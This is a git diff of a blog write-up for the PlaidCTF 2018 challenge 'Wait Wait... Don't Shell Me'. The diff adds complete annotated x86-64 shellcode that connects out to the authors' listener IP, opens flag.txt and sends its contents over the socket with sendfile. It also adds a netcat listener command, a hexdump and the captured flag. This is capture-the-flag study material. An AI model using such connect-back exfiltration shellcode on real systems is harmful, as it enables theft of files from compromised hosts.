@@ -5,14 +5,14 @@ date:   2018-05-07 3:12:44 -0500
 categories: ctfs pwn
 ---
 
-This problem was categorized under "Misc" and was worth only 125 points. Nevertheless, it was one of the harder challenges and received only 14 solves. [ghostly_gray](https://raywang.tech), [fasano](http://nation.state.actor/), and I worked on it for several hours over the course of the CTF, but we only solved it after the CTF had ended.
+This problem was categorized under "Misc" and was worth only 125 points. Nevertheless, it was one of the harder challenges and received only 14 solves. [ghostly_gray](https://raywang.tech) and I worked on it for several hours over the course of the CTF, but we only solved it after the CTF had ended.
 
 The challenge was themed around the NPR Quiz Show *[Wait Wait... Don't Tell Me!](https://en.wikipedia.org/wiki/Wait_Wait..._Don%27t_Tell_Me!)* and consisted solely of an address and port to connect to.
 
 When you connect, this is what you see:
 
 ```
-[~]> nc wwdsm.chal.pwning.xxx 6615
+$ nc wwdsm.chal.pwning.xxx 6615
 From PPP and PCTF Pittsburgh, this is
 
 +---------------------------------------------------------------------------+
@@ -41,7 +41,7 @@ __ 0f 05 58
 ?
 ```
 
-Basically, they gave us some partially filled-in shellcode. We had to fill in the blanks so that the shellcode would give us the flag when run. Sometime in the middle of the competition, the organizers released a hint stating that the server closes stdin/stdout before executing our shellcode.
+Basically, they gave us some partially filled-in shellcode, and we had to fill in the blanks so that the shellcode would give us the flag when run. Sometime in the middle of the competition, the organizers released a hint stating that the server closed stdin/stdout before executing our shellcode.
 
 Here's the partial shellcode they gave us, reformatted and annotated:
 
@@ -105,9 +105,9 @@ Next: connect. connect takes 3 arguments: `int fd` (the file descriptor of our s
 The struct looks like this:
 ```c
 struct sockaddr {
-	u_char	sa_len;       /* total length */
-	u_char	sa_family;		/* address family */
-	char	  sa_data[14];	/* actually longer; address value */*/
+	u_char  sa_len;       /* total length */
+	u_char  sa_family;    /* address family */
+	char    sa_data[14];  /* actually longer; address value */
 };
 ```
 
@@ -144,16 +144,16 @@ b8 2a 00 00 00          mov    eax,  0x2a  // 0x2a = 42
 ba 10 00 00 00          mov    edx,  0x10  // 0x10 = 16
 bf 00 00 00 00          mov    edi,  0x0
 48 89 e6                mov    rsi,  rsp   // rsi points to 02004444127e0024
-0f 05                   syscall
-be 00 00 00 00          mov    esi,  0x0
-bf b8 0c 40 00          mov    edi,  0x400000
-ba 00 00 00 00          mov    edx,  0x0
-83 c0 02                add    eax,  0x2
+0f 05                   syscall            // sets eax to 0
+be 00 00 40 00          mov    esi,  0x400000
+bf 00 00 00 00          mov    edi,  0x0
+ba 00 10 00 00          mov    edx,  0x1000
+83 c0 01                add    eax,  0x1   // 0 + 1 = 1
 0f 05                   syscall
 89 c6                   mov    esi,  eax   // we're not using this syscall
-b8 28 00 00 00          mov    eax,  0x0
+b8 00 00 00 00          mov    eax,  0x0
 bf 00 00 00 00          mov    edi,  0x0
-41 ba 80 00 00 00       mov    r10d, 0x0
+41 ba 00 00 00 00       mov    r10d, 0x0
 0f 05                   syscall
 58                      pop    rax
 ```
@@ -162,4 +162,98 @@ Note that `edi`, `esi`, and `edx` are manipulated by the shellcode before the fi
 
 ## Running it
 
-First, we setup a netcat listener on our local machine with IP address 18using `nc -l 17476`
+First, we setup a netcat listener on our local machine with IP address 18.126.0.36 using `nc -v -l 17476`. The -v flag gives more verbose output and is helpful for determining if the server has connected to the socket.
+
+Once we sent the filled-in values of our shellcode, we received [this file]({{ site.baseurl }}/assets/plaidctf2018/waitwait/header). Hexdumping it shows us that the string `flag.txt` is located at the offset 0xcb8!
+
+```
+$ xxd header
+...
+00000be0: 0000 0000 50b8 0000 0000 ba00 0000 00bf  ....P...........
+00000bf0: 0000 0000 4889 000f 05be 0000 0000 bf00  ....H...........
+00000c00: 0000 00ba 0000 0000 83c0 000f 0589 00b8  ................
+00000c10: 0000 0000 bf00 0000 0041 ba00 0000 000f  .........A......
+00000c20: 0558 662e 0f1f 8400 0000 0000 0f1f 4000  .Xf...........@.
+00000c30: 4157 4156 4189 ff41 5541 544c 8d25 ce11  AWAVA..AUATL.%..
+00000c40: 2000 5548 8d2d ce11 2000 5349 89f6 4989   .UH.-.. .SI..I.
+00000c50: d54c 29e5 4883 ec08 48c1 fd03 e8ef faff  .L).H...H.......
+00000c60: ff48 85ed 7420 31db 0f1f 8400 0000 0000  .H..t 1.........
+00000c70: 4c89 ea4c 89f6 4489 ff41 ff14 dc48 83c3  L..L..D..A...H..
+00000c80: 0148 39eb 75ea 4883 c408 5b5d 415c 415d  .H9.u.H...[]A\A]
+00000c90: 415e 415f c390 662e 0f1f 8400 0000 0000  A^A_..f.........
+00000ca0: f3c3 0000 4883 ec08 4883 c408 c300 0000  ....H...H.......
+00000cb0: 0100 0200 0000 0000 666c 6167 2e74 7874  ........flag.txt
+00000cc0: 0025 3032 7820 005f 5f20 0000 0000 0000  .%02x .__ ......
+00000cd0: 4672 6f6d 2050 5050 2061 6e64 2050 4354  From PPP and PCT
+00000ce0: 4620 5069 7474 7362 7572 6768 2c20 7468  F Pittsburgh, th
+00000cf0: 6973 2069 730a 0a2b 2d2d 2d2d 2d2d 2d2d  is is..+--------
+00000d00: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
+00000d10: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
+00000d20: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
+00000d30: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
+00000d40: 2d2d 2d2b 0a7c 2020 2020 2020 2020 2020  ---+.|          
+00000d50: 2020 2020 2020 2020 2020 2020 2057 6169               Wai
+00000d60: 7420 5761 6974 2e2e 2e20 446f 6e27 7420  t Wait... Don't
+00000d70: 5368 656c 6c20 4d65 2120 2020 2020 2020  Shell Me!
+...
+```
+
+With this, we can now finish: we know the address of `flag.txt` is 0x400cb8, so we can specify this as the second argument to open, and then use the sendfile syscall to send its contents.
+
+## socket / connect / open / sendfile
+
+socket and connect remain unchanged. open takes three arguments: `const char *filename` (a pointer to a string which contains the path to the file), `int flags` (specifies the *access modes* and other options), and `int mode` (ignored for our use case). For us, `filename` should be 0x400cb8, `flags` should be 0 to specify opening the file in read-only mode, and `mode` can be set to 0. The syscall number of open is 2.
+
+sendfile takes four arguments: `int out_fd` (the file descriptor to write to), `int in_fd` (the file descriptor to read from), `off_t *offset` (a pointer to a file offset to start reading from), and `size_t count` (how many bytes to read and write). For us, `out_fd` is our socket which has file descriptor 0. `in_fd` will probably be 1 since it's the next open descriptor. We can't set `esi` to an immediate, but we can can move `eax` into `esi`, and `eax` contains the return value of the `open` syscall, which returns the file descriptor of `flag.txt` which is exactly what we want.
+
+If `offset` is set to NULL, sendfile starts reading from the first byte, so we'll set it to 0. `count` depends on how long the flag is. We set it at 10 at first, and increased it until we got the entire flag sent over. Finally, the syscall number for sendfile is 40.
+
+In summary, here are the arguments we must set for our four syscalls:
+
+| Syscall  | `eax` | `edi`    | `esi`              | `edx`  | `r10d` |
+| -------- | ----- | -------- | ------------------ | -----  | ------ |
+| socket   | 41    | 2        | 1                  | 0      |        |
+| connect  | 42    | 0        | 0x24007e1244440002 | 16     |        |
+| open     | 2     | 0x400cb8 | 0                  | 0      |        |
+| sendfile | 40    | 0        | eax = 1            | 0      | 128    |
+
+Here is our filled in, annotated shellcode:
+
+```assembly
+b8 29 00 00 00          mov    eax,  0x29  // 0x29 = 41
+bf d9 ff ff ff          mov    edi,  0xffffffd9
+be 03 00 00 00          mov    esi,  0x3
+ba 00 00 00 00          mov    edx,  0x0
+01 c7                   add    edi,  eax   // 00xffffffd9 + 0x29 = 2
+29 fe                   sub    esi,  edi   // 0x3 - 1 = 1
+21 f2                   and    edx,  esi   // 0 & 1 = 0
+0f 05                   syscall
+48 b8 02 00 44 44 12    movabs rax,  0x24007e1244440002
+7e 00 24
+50                      push   rax
+b8 2a 00 00 00          mov    eax,  0x2a  // 0x2a = 42
+ba 10 00 00 00          mov    edx,  0x10  // 0x10 = 16
+bf 00 00 00 00          mov    edi,  0x0
+48 89 e6                mov    rsi,  rsp   // rsi points to 02004444127e0024
+0f 05                   syscall            // sets eax to 0
+be 00 00 00 00          mov    esi,  0x0
+bf b8 0c 40 00          mov    edi,  0x400cb8
+ba 00 00 00 00          mov    edx,  0x0
+83 c0 02                add    eax,  0x2   // 0 + 2 = 2
+0f 05                   syscall
+89 c6                   mov    esi,  eax   // set esi to 1
+b8 28 00 00 00          mov    eax,  0x28  // 0x28 = 40
+bf 00 00 00 00          mov    edi,  0x0
+41 ba 80 00 00 00       mov    r10d, 0x80  // 0x80 = 128
+0f 05                   syscall
+58                      pop    rax
+```
+
+Sending the filled-in bytes to the server sent the flag straight to our listener:
+
+```
+$ nc -l 17476
+PCTF{Pwner_had_enough_to_win_with_63_correct_answers_in_only_60_seconds}
+```
+
+Finally you might be interested in [this]({{site.baseurl}}/assets/plaidctf2018/waitwait/exploit.py) pwntools helper script we used to debug our shellcode locally and to output just the filled-in bytes from a completed shellcode. 
